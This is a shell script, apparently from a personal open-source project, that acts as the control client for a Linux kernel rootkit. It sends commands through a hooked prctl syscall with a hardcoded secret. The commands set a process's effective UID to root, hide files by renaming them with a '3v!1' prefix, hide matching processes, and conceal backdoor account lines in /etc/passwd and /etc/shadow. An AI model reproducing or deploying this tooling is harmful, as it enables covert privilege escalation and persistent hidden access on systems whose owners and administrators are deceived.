#!/usr/bin/env sh
# Copyright 2019 Bailey Defino
# <https://bdefino.github.io>

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

# simple rootkit driver script
# Usage: ./$0 COMMAND [ULONG | 0xHEXULONG | CARRAY ...]
# CALL
#   system call number
# COMMAND
#   module command to execute
#     drop PID -> set a process's EUID to its UID
#     elevate PID -> set a process's EUID to root
#     fugitive ETC_PASSWD_LINE ETC_SHADOW_LINE -> lines in "/etc/passwd" and "/etc/shadow"
#     hide PATH_OR_COMMAND_LINES -> hide an entity (a directory entry or ALL processes matching the command line: in that order)
#     show PATH_OR_COMMAND_LINES -> show a hidden entity (a directory entry or ALL processes matching the command line: in that order)
#     unfugitive ETC_PASSWD_LINE ETC_SHADOW_LINE -> show lines in "/etc/passwd" and "/etc/shadow"
CALL=157 # `sys_prctl`
[ -z "$1" ] && echo "Expected a command." >&2 && exit 1
COMMAND="$1"
I=0
PREFIX="3v!1"
SECRET=0xDEADBEEFDEADBEEF
SYSCALL=./syscall
REST=

for ARG in $@
do
  if [ "${I}" != 0 ]
  then
    REST="${REST} "`echo ""${ARG}""`
  fi
  I=$(( ${I} + 1 ))
done

# most of this should be done in the module,
# but sadly time isn't abundant

if [ "${COMMAND}" = hide ] || [ "${COMMAND}" = show ]
then
  for ARG in ${REST}
  do
    PREFIXED=`dirname "${ARG}"`"${PREFIX}"`basename "${ARG}"`

    if [ "${COMMAND}" = hide ] \
      && [ -e "${ARG}" ]
    then
      # hide path via rename

      echo "Hiding \"${ARG}\" via renaming (\"${OLD}\" -> \"${PREFIXED}\")."
      mv "${ARG}" "${PREFIXED}"
    elif [ "${COMMAND}" = show ] \
      && [ -e "${PREFIXED}" ]
    then
      # show path via rename

      echo "Showing \"${ARG}\" via renaming (\"${PREFIXED}\" -> \"${NEW}\")."
      mv "${PREFIXED}" "${ARG}"
    else
      # handle command line via syscall

      "${SYSCALL}" "${CALL}" "${SECRET}" "@${COMMAND}" "@${ARG}"
    fi
  done
else
  # handle directly via syscall;
  # but first, prefix strings

  _REST=

  for ARG in ${REST}
  do
    FIRST2=`echo "${ARG}" | cut -c-2`

    if [ `expr "${ARG}" : "^[[:digit:]]*\$"` = 0 ] \
      && [ "${FIRST2}" != "0X" ] \
      && [ "${FIRST2}" != "0x" ]
    then
      # character array

      ARG="@${ARG}"
    fi
    _REST="${_REST} "`echo "${ARG}"`
  done
  REST="${_REST}"
  "${SYSCALL}" "${CALL}" "${SECRET}" "@${COMMAND}" ${REST}
fi

